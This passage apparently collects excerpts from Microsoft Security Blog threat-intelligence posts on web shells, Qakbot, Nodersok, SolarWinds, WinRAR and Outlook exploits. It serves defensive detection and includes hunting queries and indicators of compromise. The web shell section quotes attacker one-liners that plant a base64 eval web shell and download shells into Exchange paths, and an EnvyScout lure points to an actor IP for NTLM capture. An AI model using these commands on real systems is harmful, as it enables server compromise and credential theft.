knowledge and showcases a new detection method in Microsoft Defender for Endpoint that can help prevent detection evasion. Since data and signals from Microsoft Defender for Endpoint also feed into Microsoft 365 Defender, this new detection method further enriches our protection technologies, providing customers a comprehensive and coordinated threat defense against threats. \nThe stealth execution techniques discussed further prove that the threat landscape is constantly evolving, and that attackers will always look for new avenues to evade detection. This highlights the importance of continuous research on potential attack vectors, as well as future-proof solutions. We hope that the principles presented in this blog post can be used by other researchers in developing similar solutions. \nPhilip Tsukerman, Amir Kutcher, and Tomer Cabouly Microsoft 365 Defender Research Team ", "source": "microsoft"}, {"title": "Introduction", "content": "NV.html, tracked by Microsoft as EnvyScout, can be best described as a malicious dropper capable of de-obfuscating and writing a malicious ISO file to disk. EnvyScout is chiefly delivered to targets of NOBELIUM by way of an attachment to spear-phishing emails. \nThe HTML <body> section of NV.html contains four notable components: \nComponent #1: Tracking and credential-harvesting URLs \n<body> (center)   \n9 (img src = file://54.38.137.218/img_lk.png>   \n16 <img src = http://enpport.com/img_tst.jpg> (div) \nIn one variant of EnvyScout, the $<$ <body> section contains two URLs, as shown above. \nThe first, prefixed with a file:// protocol handler, is indicative of an attempt to coax the operating system to send sensitive NTLMv2 material to the specified actorcontrolled IP address over port 445. It is likely that the attacker is running a credential capturing service, such as Responder, at the other end of these transactions. Later, brute-forcing of these credentials may result in their exposure. \nThe second URL, which resolves to the same IP address as the former at the time of analysis, remotely sources an image that is part of the HTML lure. This technique, sometimes referred to as a \"web bug\", serves as a read receipt of sorts to NOBELIUM, validating that the prospective target followed through with opening the malicious attachment. ", "source": "microsoft"}, {"title": "Introduction", "content": "Light \nBlog home / Threat intelligence All Microsoft\ue70d Products\ue70d \nResearch Threat intelligence Attacker techniques, tools, and infrastructure \n23 min read \nTech support scams persist with increasingly crafty techniques \nBy Microsoft Defender Security Research Team \nAttacker techniques, tools, and infrastructure \n(Note: Our Tech support scams FAQ page has the latest info on this type of threat, including scammer tactics, fake error messages, and the latest scammer hotlines. You can also read our latest blog, Teaming up in the war on tech support scams.) \nMillions of users continue to encounter technical support scams. Data from Windows Defender SmartScreen (which is used by both Microsoft Edge and Internet Explorer to block malicious sites) and Windows Defender Antivirus show that some three million users are subjected to these threats every month. \nIn addition to being rampant, technical support scams continue to evolve, employing more and more complex social engineering tactics that can increase panic and create a false sense of legitimacy or urgency in an effort to get more victims. \nGiven the sheer volume of tech support scams and the pace at which they evolve, here at Microsoft we take a holistic approach to this problem. We monitor the threat landscape for patterns and variations in threat behavior. Using intelligence from sensors, we employ machine learning models to deliver cloud-based protection against the latest tech support scams, whether they take the form of web pages with malicious scripts or Trojans that run on computers. \nIn 2016, the threat of support scam was most felt in the United States, which saw $58\\%$ of encounters. United Kingdom, Canada, and Australia follow, with $13\\%$ , $11\\%,$ and $8\\%$ of encounters, respectively. Notably, significant encounters were also registered in France and Spain, where we saw localized technical support scam attacks. \n(Note: This blog post is the third in the 2016 threat landscape review series. It follows the review of exploit kits and ransomware. The series looks at how major areas in the threat landscape transformed over the past year. For the latest info on tech support scams, go to our tech support scams FAQ page.) ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Incident Response Microsoft Threat Intelligence \nOne year ago, we reported the steady increase in the use of web shells in attacks worldwide. The latest Microsoft 365 Defender data shows that this trend not only continued, it accelerated: every month from August 2020 to January 2021, we registered an average of 140,000 encounters of these threats on servers, almost double the 77,000 monthly average we saw last year. \nThe escalating prevalence of web shells may be attributed to how simple and effective they can be for attackers. A web shell is typically a small piece of malicious code written in typical web development programming languages (e.g., ASP, PHP, JSP) that attackers implant on web servers to provide remote access and code execution to server functions. Web shells allow attackers to run commands on servers to steal data or use the server as launch pad for other activities like credential theft, lateral movement, deployment of additional payloads, or handson-keyboard activity, while allowing attackers to persist in an affected organization. \nAs web shells are increasingly more common in attacks, both commodity and targeted, we continue to monitor and investigate this trend to ensure customers are protected. In this blog, we will discuss challenges in detecting web shells, and the Microsoft technologies and investigation tools available today that organizations can use to defend against these threats. We will also share guidance for hardening networks against web shell attacks. ", "source": "microsoft"}, {"title": "defend", "content": "Gaining visibility into internet-facing servers is key to detecting and addressing the threat of web shells. To tackle challenges in detecting these threats, Microsoft Defender for Endpoint uses a combination of durable protections that prevent web shell installation and behavior-based detections that identify related malicious activity. Microsoft Defender for Endpoint exposes malicious behavior by analyzing script file writes and process executions. Due to the nature of web shells, static analysis is not effective-as we have shown, it is relatively easy to modify web shells and bypass static protections. To effectively deliver protection, Microsoft Defender for Endpoint uses multiple layers of protection through behavior inspection. \nBehavior-based blocking and containment capabilities, which use engines that specialize in detecting threats by analyzing behavior, monitor web-accessible directories for any new script file creation. While file creation events alone cannot be treated as suspicious, correlating such events with the responsible process tree can yield more reliable signals and surface malicious attempts. The engine can then remediate the script, neutralizing the primary infection vector. For example, IIS instance (w3wp.exe) running suspicious processes such as 'cmd.exe /c echo', 'certutil.exe', or 'powershell.exe' that result in the creation of script files in web - accessible folders is a rare event and is, thus, typically a strong sign of web server compromise and web shell installation. \nWeb shell attacks continue to rise | Microsoft Security Blog cmd.exe /c echo ^c%@ Page Language=\"Jscript\"%^) ^<%eval(System.Text.Encoding.GetEncoding(65001). GetString(System.Convert.FromBase64String( Server.UrlDecode(Request.Cookies[\"_VIEWSTATE\"].Value))), \"unsafe\")%^> > \"%CommonProgramFiles%\\Microsoft Shared\\ Web Server Extensions\\16\\TEMPLATE\\LAYouTS\\GroupedItemPicker.aspx\" \npowershell -c \"\\$wb=New-object Net.WebClient; \\$wb.DownloadFile(\"https:// .com/s.txt\" \"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ FrontEnd\\HttpProxy\\ecp\\auth\\kufwdGUwMqCh.aspx\") \nMicrosoft Defender for Endpoint also detects web shell installation attempts originating from remote systems within the organization using various lateral movement methods. For example, attackers have been observed to drop web shells through Windows Remote Management (WinRM) or use existing Windows commands to transfer web shells over SMB. On the web server, these remote actions are carried by system processes, thus giving visibility into the process tree. System privilege process dropping script files is another suspicious event and provides the behavior inspection engines ways to remediate the script before the attackers can perform any malicious actions. \npowershell -c \"\\$p=winrs /r: powershell -c '\\$env:exchangeinstallpath'; $\\$6=$ (Split-Path -Path \\$p -Qualifier); $\\$61=$ 11 $+\\$6[0]+$ $\\$123,456$ -Replace \\$b,\\$b1;; $\\$1=\\S p+$ 'frontend\\httpproxy\\owa\\auth\\errorEE.aspx'; $\\$6=$ [System.Convert]::FromBase64String('....'); [System.I0.File]::WriteAllbytes(\\$a, \\$b);' \ncmd.exe /c copy logonout.aspx \"1 e\\$\\Program Files^Microsoft\\Exchange Serven \\V15\\FrontEnd\\HttpProxy\\owa\\auth\\register.aspx\" \nBehavior-based protection also provides post-compromise defense in scenarios where attackers are already operating and running commands on web servers. Once attackers gain access to a server, one of their first steps is to understand the privilege and the environment they have access to by using built-in reconnaissance commands that are not typically used by web applications. IIS instance (w3wp.exe) running commands like 'net', 'whoami', 'dir', 'cmd.exe', or 'query', to name a few, is typically a strong early indicator of web shell activity. \nIIS servers have built-in management tools used by administrators to perform various maintenance tasks. These platforms surface various PowerShell cmdlets that can expose critical information to the attackers. IIS instances (w3wp.exe) that host various web-facing client services such as Outlook on the web (formerly known as Outlook Web App or OWA) or Exchange admin center (EAC; formerly known as the Exchange Control Panel or ECP) accessing the management platform or executing below cmdlets is a suspicious activity and signifies a hands-on-keyboard attack. The behavior engine monitors execution of such cmdlets and the responsible process trees, for example: \nAdd-PSSnapin 'Microsoft.SharePoint.PowerShell   \nAdd-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn   \nnew-managementroleassignment   \nget-managementroleassignment   \nnew-inboxrule   \nnew-transportrule   \nnew-journalrule   \nnew-mailboxexportrequest   \nnew-mailboxsearch   \nnew-compliancesearch   \nget-mailboxpermission   \nadd-mailboxpermission   \nadd-mailboxfolderpermission   \nupdate-rolegroupmember   \nadd-rolegroupmember   \ninstall-transportagent \nWith its behavior-based blocking and containment capabilities, Microsoft Defender for Endpoint can identify and stop behavior associated with web shell attacks. It raises alerts for these detections, enabling security operations teams to use the rich investigation tools in Microsoft Defender for Endpoint to perform additional investigation and hunting for related or similar threats. \nAnactive'Woreflint'malwarewasblocked \nMicrosoft 365 Defender and Microsoft Defender for Endpoint customers can also run advanced hunting queries to proactively hunt for web shell attacks: \nLook for suspicious process that IIS worker process (w3wp.exe), Apache HTTP server processes (httpd.exe, visualsvnserver.exe), etc. do not typically initiate (e.g., cmd.exe and powershell.exe) \nDeviceProcessEvents   \n| where InitiatingProcessCommandLine   \nhas_any(\"beasvc.exe\",\"coldfusion.exe\",\"httpd.exe\",\"owstimer.exe\",\"visualsvns   \nerver.exe\",\"w3wp.exe\") or InitiatingProcessCommandLine contains 'tomcat'   \n| where FileName $\\!=$ \"csc.exe\" // exclude csharp compiler   \n| where FileName $\\!=$ \"php-cgi.exe\" //exclude php group, fast cgi   \n| where FileName $\\!=$ \"vbc.exe\" //exclude Visual Basic Command Line Compiler summarize by FileName \nLook for suspicious web shell execution, this can identify processes that are associated with remote execution and reconnaissance activity (example: \"arp\", \"certutil\", \"cmd\", \"echo\", \"ipconfig\", \"gpresult\", \"hostname\", \"net\", \"netstat\", \"nltest\", \"nslookup\", \"ping\", \"powershell\", \"psexec\", \"qwinsta\", \"route\", \"systeminfo\", \"tasklist\", \"wget\", \"whoami\", \"wmic\", etc.) \nDeviceProcessEvents   \n| where InitiatingProcessParentFileName in\\~   \n(\"beasvc.exe\",\"coldfusion.exe\",\"httpd.exe\",\"owstimer.exe\",\"visualsvnserver.e   \nxe\",\"w3wp.exe\") or InitiatingProcessParentFileName startswith \"tomcat\"   \n| where InitiatingProcessFileName in\\~   \n(\"powershell.exe\",\"powershell_ise.exe\",\"cmd.exe\")   \n| where FileName != 'conhost.exe' ", "source": "microsoft"}, {"title": "Introduction", "content": "The Nodersok campaign has been pestering thousands of machines in the last several weeks, with most targets located in the United States and Europe. The majority of targets are consumers, but about $3\\%$ of encounters are observed in organizations in sectors like education, professional services, healthcare, finance, and retail. \nThe campaign is particularly interesting not only because it employs advanced fileless techniques, but also because it relies on an elusive network infrastructure that causes the attack to fly under the radar. We uncovered this campaign in midJuly, when suspicious patterns in the anomalous usage of MSHTA.exe emerged from Microsoft Defender ATP telemetry. In the days that followed, more anomalies stood out, showing up to a ten-fold increase in activity: \nAfter a process of tracking and analysis, we pieced together the infection chain: \nLike the Astaroth campaign, every step of the infection chain only runs legitimate LOLBins, either from the machine itself (mshta.exe, powershell.exe) or downloaded third-party ones (node.exe, Windivert.dll/sys). All of the relevant functionalities reside in scripts and shellcodes that are almost always coming in encrypted, are then decrypted, and run while only in memory. No malicious executable is ever written to the disk. \nThis infection chain was consistently observed in several machines attacked by the latest variant of Nodersok. Other campaigns (possibly earlier versions) with variants of this malware (whose main JavaScript payload was named 05sall.js or 04sall.js) were observed installing malicious encoded PowerShell commands in the registry that would end up decoding and running the final binary executable payload. ", "source": "microsoft"}, {"title": "defend", "content": "Both the distributed network infrastructure and the advanced fileless techniques allowed this campaign fly under the radar for a while, highlighting how having the right defensive technologies is of utmost importance in order to detect and counter these attacks in a timely manner. \nIf we exclude all the clean and legitimate files leveraged by the attack, all that remains are the initial HTA file, the final Node.js-based payload, and a bunch of encrypted files. Traditional file-based signatures are inadequate to counter \nBring your own LOLBin: Multi-stage, fileless Nodersok campaign delivers rare Node.js-based malware | Microsoft Security Blog sophisticated threats like this. We have known this for quite a while, that's why we have invested a good deal of resources into developing powerful dynamic detection engines and delivering a state-of-the-art defense-in-depth through Microsoft Defender ATP: \nMachine learning models in the Windows Defender Antivirus client generically detects suspicious obfuscation in the initial HTA file used in this attack. Beyond this immediate protection, behavioral detection and containment capabilities can spot anomalous and malicious behaviors, such as the execution of scripts and tools. When the behavior monitoring engine in the client detects one of the more than 500 attack techniques, information like the process tree and behavior sequences are sent to the cloud, where behavior-based machine learning models classify files and identify potential threats. \nMeanwhile, scripts that are decrypted and run directly in memory are exposed by Antimalware Scan Interface (AMSI) instrumentation in scripting engines, while launching PowerShell with a command-line that specifies encoded commands is defeated by command-line scanning. Tamper protection in Microsoft Defender ATP protects against system modifications that attempt to disable Windows Defender Antivirus. \nThese multiple layers of protection are part of the threat and malware prevention capabilities in Microsoft Defender ATP. The complete endpoint protection platform provides multiple capabilities that empower security teams to defend their organizations against attacks like Nodersok. Attack surface reduction shuts common attack surfaces. Threat and vulnerability management, endpoint detection and response, and automated investigation and remediation help organizations detect and respond to cyberattacks. Microsoft Threat Experts, Microsoft Defender ATP's managed detection and response service, further helps security teams by providing expert-level monitoring and analysis. \nWith Microsoft Threat Protection, these endpoint protection capabilities integrate with the rest of Microsoft security solutions to deliver comprehensive protection for comprehensive security for identities, endpoints, email and data, apps, and infrastructure. \nAndrea Lelli Microsoft Defender ATP Research ", "source": "microsoft"}, {"title": "Introduction", "content": "Protect your organization against ransomware: aka.ms/ransomware \nLearn how attackers operate: Human-operated ransomware attacks: A preventable disaster \nThe use of another human element in BazaCall's attack chain through the abovementioned hands-on-keyboard control further makes this threat more dangerous and more evasive than traditional, automated malware attacks. BazaCall campaigns highlight the importance of cross-domain optics and the ability to correlate events in building a comprehensive defense against complex threats. \nMicrosoft 365 Defender orchestrates protection across domains to deliver coordinated defense. In the case of BazaCall, Microsoft Defender for Endpoint detects malware and attacker behavior resulting from the campaign, and these signals inform Microsoft Defender for Office 365 protections against related emails, even if these emails don't have the typical malicious artifacts. Microsoft threat analysts who constantly monitor BazaCall campaigns enrich the intelligence on this threat and enhance our ability to protect customers. \nIn this blog post, we discuss how a recent BazaCall campaign attempts to compromise systems and networks through the mentioned human elements and how Microsoft defends against it. ", "source": "microsoft"}, {"title": "Introduction", "content": "Like other modular malware, Qakbot infections may look differently on each affected device, depending on the operator using the said malware and their deployment of the threat campaign. However, based on our analysis, one can break down a Qakbot-related incident into a set of distinct \"building blocks,\" which can help security analysts identify and respond to Qakbot campaigns. Figure 1 below represents these building blocks. From our observation, each Qakbot attack chain can only have one block of each color. The first row and the macro block represent the email mechanism used to deliver Qakbot. \nCertain building blocks within each campaign are consistent, but not all of them are observed on each affected device. As seen in a sample Qakbot campaign below (Figure 2), the top two rows represent the mechanisms adopted to deliver the malware on the three devices, while the succeeding ones are the activities it performs once running on each device. For instance, notice that Devices A and C were seen to have email exfiltration, while Device B was not: \nTherefore, from an analyst's viewpoint, what Figure 2 implies is that even if email exfiltration was not observed in one device, it doesn't mean that this routine didn't happen at all in their organization's network. \nFrom our research, we identified ten building blocks, which we will discuss in the succeeding sections. ", "source": "microsoft"}, {"title": "Defense", "content": "Qakbot's continued prevalence in the threat landscape demands comprehensive protection capable of detecting and stopping this malware, its components, and other similar threats at every stage of the attack chain: email delivery, network activity, endpoint behavior, and follow-on attacker activities. Microsoft 365 Defender provides coordinated defense using multiple layers of dynamic protection technologies\u00ad-including machine learning-based protection-and correlating threat data from email, endpoints, identities, and cloud apps. It is also backed by a global network of threat experts who continuously monitor the threat landscape for new, resurging, and evolving attacker tools and techniques. \nMicrosoft Defender for Office 365 detects and blocks emails that attempt to deliver Qakbot. Safe Links and Safe Attachments provide real-time protection by leveraging a built-in sandbox that examines and detonates links and attachments in messages before they get delivered to target recipients. However, for those messages without such artifacts, Microsoft Defender SmartScreen in Microsoft Edge and other web browsers that support it blocks the malicious websites and prevents downloading the malicious Excel file on devices. \nOn endpoints, attack surface reduction rules detect and block common attack techniques used by Qakbot and subsequent threats that may result from its activities. Endpoint detection and response (EDR) capabilities detect malicious files, malicious behavior, and other related events before and after execution. Network protection also blocks subsequent attempts by Qakbot to connect to malicious domains and IP addresses, and Advanced hunting lets defenders create custom detections to proactively find this malware and other related threats. \nDefenders can also do the following mitigation steps to reduce the impact of Qakbot in their organizations: \nA closer look at Qakbot's latest building blocks (and how to knock them down) | Microsoft Security Blo   \nCheck your Office 365 email filtering settings to ensure you block spoofed emails, spam, and emails with malware. Use Office 365 security for enhanced phishing protection and coverage against new threats and polymorphic variants. Configure Office 365 to recheck links on click.   \nEnable Zero-hour auto purge (ZAP) in Exchange Online, which is an email protection capability that retroactively detects and neutralizes malicious messages that have already been delivered in response to newly acquired threat intelligence.   \nEncourage users to use Microsoft Edge and other web browsers that support SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware. Enable network protection to prevent applications or users from accessing malicious domains and other malicious content on the internet.   \nStop malicious XLM or VBA macros by ensuring runtime macro scanning by Windows Antimalware Scan Interface (AMSI) is on. This feature-enabled by default-is on if the Group Policy setting for Macro Run Time Scan Scope is set to Enable for All Files or Enable for Low Trust Files.   \nTurn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants.   \nTurn on tamper protection features to prevent attackers from stopping security services.   \nRun EDR in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus doesn't detect the threat or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-breach.   \nEnable investigation and remediation in full automated mode to allow Microsoft Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume.   \nUse device discovery to increase your visibility into your network by finding unmanaged devices on your network and onboarding them to Microsoft Defender for Endpoint.   \nUse multi-factor authentication (MFA) to mitigate credential theft and prevent attacker access. Keep MFA always-on for privileged accounts and apply riskbased MFA for normal accounts. Consider transitioning to a passwordless primary authentication method, such as Azure MFA, certificates, or Windows Hello for Business.   \nRun realistic, yet safe, simulated phishing and password attack campaigns in your organization using Attack Simulator for Microsoft Defender for Office 365. Run spear-phishing (credential harvest) simulations to train end users against clicking URLs in unsolicited messages and disclosing their credentials.   \nEducate end users about identifying lures in spear-phishing emails and watering hole attacks, protecting personal and business information in social media, and filtering unsolicited communication. Encourage users to report reconnaissance attempts and other suspicious activity. \nLearn how you can stop attacks through automated, cross-domain security with Microsoft 365 Defender. ", "source": "microsoft"}, {"title": "Introduction", "content": "Chris: First, you can use the control system itself, which already offers some level of visibility into what's happening. It looks like NASA control. Operators sit and watch the process all day. You can see what looks normal and what doesn't look normal. \nWhat's new is not just looking at the system itself but at OT network security. Especially in the last five or six years, the focus has been on getting network visibility sensors into the control network. There are several vendors out there that understand the protocols, like MODBUS, Siemens S7, and DNP3, and have developed sensors that are purpose-built to analyze OT network traffic rather than IT traffic. \nWith a newer control system, it's much easier. Many times, they'll use virtual machines to manage OT, so you can put agents in those areas. If it's a Windows 10 or Windows 7 environment, you can even use Microsoft Defender Antivirus and collect the Windows event logs and switch logs. If you don't look at the logs, you're not going to know what's there, so you need to monitor behavior at the network layer using technologies like deep packet inspection (DPI) to identify compromised devices. ", "source": "microsoft"}, {"title": "Introduction", "content": "The concept of malicious IIS has been around since at least 2013. Historical malware analysis shows how crimeware groups used IIS modules to intercept client logons and payment details by using the BeginRequest triggers to read userprovided parameters before the webserver processes them. \nOne of the first examples of sophisticated IIS modules was discovered in late 2021. The vendor's ICEAPPLE report details an IIS module that was used by an actor to reflectively load further .NET modules, which by extension, loads further .NET capability. This allowed the actor to have minimal malicious indicators in the base IIS module, then load further capabilities as required. \nA more recent example was provided in a recent Microsoft blog, where the actor instead opted for child process execution rather than loading the capability directly into w3wp.exe. This blog delves further into the capability to discuss the different capabilities that malicious IIS modules have access to. ", "source": "microsoft"}, {"title": "Conclusion", "content": "Threat actors use a variety of techniques to conceal their activity when using malicious IIS modules. Enabling additional logging in your environment is recommended to facilitate the detection of these harmful modules. Specifically, IIS servers should enable the optional event log Microsoft IIS Configuration Operational. This log can provide insight into IIS modules being added or removed from the IIS server and track any modifications made to web.config. \nIIS Servers should have their web.config and IIS modules monitored for malicious modifications being made. For example, Gacutil.exe and appcmd.exe being executed from w3wp.exe should be monitored for potential installation of IIS modules. Additionally, the bin directories of websites and the default GAC path should be monitored and regularly scanned for malicious modules being created. \nHunting for malicious IIS modules can be performed through Microsoft Defender for Endpoint or your EDR of choice, and it should be conducted regularly to detect abnormal w3wp.exe interactions. This can include, but is not limited to, process creation, file creation and named pipe creation. Due to the wide flexibility around how IIS modules can execute malicious code, it's important to look for irregularities in behavior. \nDetecting web exploitation and malicious IIS modules should be a priority for all organizations, and Microsoft DART believes that following the recommendations provided in this blog and along with the monitoring and detection strategies will assist your organization in the detection and response of these threats. ", "source": "microsoft"}, {"title": "Introduction", "content": "A spear-phishing email purporting to be from the Ministry of Foreign Affairs (MFA) of the Islamic Republic of Afghanistan was sent to very specific targets and asked for \"resources, telecommunication services and satellite maps\". The email came with a Word document attachment. \nWhen opened, the document asks the recipient to download another document from a now-inactive OneDrive link. While the URL was down during our analysis, we still reported the case to the OneDrive team. \nThe use of a document with just a link-no malicious macro or embedded object- was likely meant to evade conventional email security protection. This didn't work against Office $365\\mathsf{A T P},$ which has the capability to scan emails and Office documents for URLs and analyze links for malicious behavior. \nClicking the link downloads an archive file containing a second Word document, which has malicious macro. Microsoft Word opens the document with security warning. Enabling the macro starts a series of malicious actions that leads to the download of the malware payload. \nAnalysis of a targeted attack exploiting the WinRAR CVE-2018-20250 vulnerability | Microsoft Security Blog Interestingly, the document has a \"Next Page\" button. Clicking that button displays a fake message signifying that a certain DLL file is missing, and that the computer needs to restart. This is a social engineering technique that ensures the computer is restarted, which is needed for the payload to run. (More on this later.) \nMeanwhile, with the macro enabled, the malicious code performs the following in the background: \nExtract and decode a data blob from TextBox form and drop it as C:\\Windows\\Temp\\id.png Create a malicious Visual Basic Script (VBScript) and drop it as C:\\Windows\\Temp\\temp.vbs   \nAdd persistence by creating a COM object and adding autorun registry key to launch the created shell object   \nLaunch temp.vbs, which is a wrapper for the malicious PowerShell command that decodes the id.png file, which results in the second-stage PowerShell script that is highly obfuscated and contains multi-layered encryption (this PowerShell script is similar to a script that has been used in past MuddyWater campaigns) \nThe second-stage PowerShell script collects system information, generates unique computer ID, and sends these to remote location. It acts as a backdoor and can accept commands, including: \nDownload arbitrary file   \nRun command using cmd.exe   \nDecode a base64-encoded command and run it using PowerShell \nThe PowerShell script's ability to accept commands and download programs provided a way for a remote attacker to deliver the malicious ACE file containing CVE-2018-20250 exploit. When triggered, the exploit then drops the payload dropbox.exe. \nThe next sections discuss in detail the key components of this attack chain. ", "source": "microsoft"}, {"title": "Protection", "content": "These advanced defenses from Office 365 ATP are shared with other services in Microsoft Threat Protection, which provides seamless, integrated, and comprehensive protection against multiple attack vectors. Through signal-sharing Microsoft threat Protection orchestrates threat remediation. \nFor endpoints that are not protected by Office 365 ATP, Microsoft Defender ATP detects the attacker techniques used in this targeted attack. Microsoft Defender ATP is a unified endpoint protection platform for attack surface reduction, next generation protection, endpoint detection & response (EDR), auto investigation & remediation, as well as recently announced managed threat hunting and threat & vulnerability management. \nMicrosoft Defender ATP uses machine learning, behavior monitoring, and heuristics to detect sophisticated threats. Its industry-leading optics, integration with Office 365 ATP and other Microsoft Threat Protection services, and use of AMSI give it unique capabilities to detect attacker techniques, including the exploit, obfuscation, detection evasion, and fileless techniques observed in this attack. \nThe attacks that immediately exploited the WinRAR vulnerability demonstrate the importance of threat & vulnerability management in reducing organizational risk. Even if your organization was not affected by this attack against specific organizations in the satellite and communications industry, there are other malware campaigns that used the exploits. \nMicrosoft Defender ATP's threat & vulnerability management capability uses a riskbased approach to the discovery, prioritization, and remediation of endpoint vulnerabilities. As a component of a unified endpoint protection platform, threat & hunting vulnerability management in Microsoft Defender ATP provides these unique benefits: \nReal-time correlation of EDR insights with info on endpoint vulnerabilities Invaluable endpoint vulnerability context for incident investigations Built-in remediation processes through Microsoft Intune and Microsoft System Center Configuration Manager \nThe complex attack chain that incorporated sophisticated techniques observed in this targeted attack highlights the benefits of a comprehensive protection enriched by telemetry collected across the entire attack chain. Microsoft Threat Protection continues to evolve to provide integrated threat protection solution for the modern workplace. \nRex Plantado Office 365 ATP Research Team ", "source": "microsoft"}, {"title": "Indicators of compromise", "content": "Files (SHA-256): \n68133eb271d442216e66a8267728ab38bf143627aa5026a4a6d07bb616b3d9fd (Original email attachment) \u2013 detected as Trojan:O97M/Maudon.A   \nef3617a68208f047ccae2d169b8208aa87df9a4b8959e529577fe11c2e0d08c3 (Document hosted in OneDrive link) \u2013 detected as Trojan:O97M/Maudon.A   \n4cb0b2d9a4275d7e7f532f52c1b6ba2bd228a7b50735b0a644d2ecae96263352 (ACE file with CVE-2018-20250 exploit) \u2013 detected as Exploit:Win32/CVE2018-20250   \n6f78748f5b2902c05e88c1d2e45de8e7c635512a5f25d25217766554534277fe (dropbox.exe (Win64 Payload)) \u2013 detected as Trojan:Win32/Maudon.A   \nc0c22e689e1e9fa11cbf8718405b20ce57c1d7c85d8e6e45c617e2b095b01b15 (Encoded id.png) \u2013 detected as Trojan:PowerShell/Maudon.A   \n0089736ee162095ac2e4e66de6468dbb7824fe73996bbea48a3bb85f7fdd53e4 (temp.vbs) \u2013 detected as ThreatRelated   \n1c25286b8dea0ebe4e8fca0181c474ff47cf822330ef3613a7d599c12b37ff5f (PowerShell script decrypted from id.png) \u2013 detected as Trojan:PowerShell/Maudon.A   \n144b3aa998cf9f30d6698bebe68a1248ca36dc5be534b1dedee471ada7302971 (Decrypted PowerShell) \u2013 detected as Trojan:PowerShell/Maudon.A \nURLs: \nhxxps://1drv[.]ms/u/s!AgvJCoYH9skpgUNf3Y3bfhSyFQao hxxp://162[.]223[.]89[.]53/oa/ hxxp://162[.]223[.]89[.]53/oc/api/?t $\\mathrel{\\mathop:}=$ <BOTID> hxxp://162[.]223[.]89[.]53/or/? $\\mathrel{\\mathop:}=<$ <BOTID> ", "source": "microsoft"}, {"title": "Introduction", "content": "The group Microsoft tracks as Forest Blizzard (STRONTIUM) is a Russian state-sponsored threat actor that primarily targets government, energy, transportation, and non-governmental organizations in the United States, Europe, and the Middle East. The United States and United Kingdom governments have linked Forest Blizzard to Unit 26165 of the Russian Federation's military intelligence agency: Main Intelligence Directorate of the General Staff of the Armed Forces of the Russian Federation (GRU). \nForest Blizzard commonly seeks and employs publicly available exploits in addition to CVE-2023-23397. Beginning in at least the first half of September 2023, Forest Blizzard actors leveraged the WinRAR CVE 2023- 38831 vulnerability to adapt spear-phishing operations against chiefly Ukrainian government targets. Other known exploits leveraged by Forest Blizzard include CVE-2021-40444, CVE-2021-42292, CVE-2021-42321, CVE2021-34473, CVE-2020-17144, and CVE-2020-0688. \nForest Blizzard continually refines its footprint by employing new custom techniques and malware, suggesting that it is a well-resourced and welltrained group posing long-term challenges to attribution and tracking its activities. Microsoft continually updates detections and protections against this threat group based on our telemetry and research. Other security researchers have used GRU Unit 26165, APT28, Sednit, Sofacy, and Fancy Bear to refer to groups with similar or related activities. \nThis guide provides steps organizations can take to assess whether users have been targeted or compromised by threat actors exploiting CVE-2023-23397. A successful exploit of this vulnerability can result in unauthorized access to an organization's environment by triggering a Net-NTLMv2 hash leak. Understanding the vulnerability and how it has been leveraged by threat actors can help guide the overall investigative process. \nThis document covers: \nAn overview of the vulnerability Exploit scenarios Post-exploit activities observed in attacks   \nTechniques for determining if an organization was targeted or compromised via this vulnerability   \nMitigations available to protect your environment \nExploitation of CVE-2023-23397 leaves very few forensic artifacts to discover in traditional endpoint forensic analysis. This blog describes how Microsoft Incident Response (previously known as Microsoft Detection and Response Team \u2013 DART) was able to detect the abuse of CVE-2023-23397 and how organizations can identify historical and present evidence of compromise through this vulnerability. \nThis vulnerability triggers a Net-NTLMv2 hash leak. Abuse of the leaked NetNTLMv2 hash is post-exploitation activity. In this blog, we emphasize specific observed post-exploitation activity that targeted Microsoft Exchange Server. \nHowever, there are numerous ways that a leaked Net-NTLMv2 hash could be used by a threat actor. ", "source": "microsoft"}, {"title": "Introduction", "content": "The attackers inserted malicious code into SolarWinds.Orion.Core.BusinessLayer.dll, a code library belonging to the SolarWinds Orion Platform. The attackers had to find a suitable place in this DLL component to insert their code. Ideally, they would choose a place in a method that gets invoked periodically, ensuring both execution and persistence, so that the malicious code is guaranteed to be always up and running. Such a suitable location turns out to be a method named RefreshInternal. \nThe modification to this function is very lightweight and could be easily overlooked -all it does is to execute the method OrionImprovementBusinessLayer.Initialize within a parallel thread, so that the normal execution flow of RefreshInternal is not altered. \nWhy was this method chosen rather than other ones? A quick look at the architecture of this DLL shows that RefreshInternal is part of the class SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager and is invoked by a sequence of methods that can be traced back to the CoreBusinessLayerPlugin class. The purpose of this class, which initiates its execution with a method named Start (likely at an early stage when the DLL is loaded), is to initialize various other components and schedule the execution of several tasks. Among those tasks is Background Inventory, which ultimately starts the malicious code. \nThe functionality of the backdoor resides entirely in the class OrionImprovementBusinessLayer, comprising 13 subclasses and 16 methods. Its name blends in with the rest of the legitimate code. The threat actors were savvy enough to avoid give-away terminology like \"backdoor\", \"keylogger\", etc., and instead opted for a more neutral jargon. At first glance, the code in this DLL looks normal and doesn't raise suspicions, which could be part of the reason why the insertion of malicious code was undetected for months, especially if the code for this DLL was not frequently updated. \nTo have some minimal form of obfuscation from prying eyes, the strings in the backdoor are compressed and encoded in Base64, or their hashes are used instead. ", "source": "microsoft"}, {"title": "defend", "content": "Supply chain compromise continues to be a growing concern in the security industry. The Solorigate incident is a grave reminder that these kinds of attacks can achieve the harmful combination of widespread impact and deep consequences for successfully compromised networks. We continue to urge customers to: \nIsolate and investigate devices where these malicious binaries have been detected   \nIdentify accounts that have been used on the affected device and consider them compromised   \nInvestigate how those endpoints might have been compromised Investigate the timeline of device compromise for indications of lateral movement \nHardening networks by reducing attack surfaces and building strong preventative protection are baseline requirements for defending organizations. On top of that, comprehensive visibility into system and network activities drive the early detection of anomalous behaviors and potential signs of compromise. More importantly, the ability to correlate signals through AI could surface more evasive attacker activity. \nMicrosoft Defender for 